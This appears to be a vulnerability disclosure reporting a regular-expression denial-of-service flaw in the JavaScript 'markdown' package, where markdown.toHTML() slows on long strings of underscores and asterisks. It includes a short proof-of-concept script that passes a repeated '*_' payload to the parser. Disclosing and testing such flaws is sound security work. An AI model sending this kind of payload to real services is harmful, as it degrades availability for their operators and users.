# Description
```markdown``` is yet another Markdown parser, this time for JavaScript.
This package is vulnerable to ```Regular Expression Denial of Service(ReDoS)```. The ```markdown.toHTML()``` function will degrade performance when parsing long strings with underscores. Eg: ```*_*_*_```. This may lead to ReDos

#Proof-of-Concept
```
const markdown = require('markdown').markdown;
const payload = "*_".repeat(100);
console.log(markdown.toHTML(payload));
```
You can try changing the repeatation from 10 and then to 100 to see the degradation in performance.